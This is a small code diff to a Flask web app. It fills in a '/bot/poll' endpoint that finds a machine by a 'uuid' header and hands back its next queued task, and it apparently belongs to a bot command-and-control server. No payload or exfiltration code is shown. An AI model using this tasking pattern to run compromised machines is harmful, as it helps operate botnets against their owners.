@@ -36,8 +36,17 @@ def index(hostname):
 
 @app.route('/bot/poll', methods=['GET'])
 def poll():
-    # db.collection('machines').document(request.args.get('uuid')).get()
-    return ''
+    machine = db.collection('machines').where(
+        'uuid', '==', request.headers.get('uuid')).limit(1).get()
+
+    if not machine:
+        return {'Error': 'No machines found'}
+
+    if machine[0].to_dict()['tasks']:
+        return {'task': machine[0].to_dict()['tasks'][0]}
+
+    return ('', 418)
+
 
 @app.route('/bot/out')
 def out():
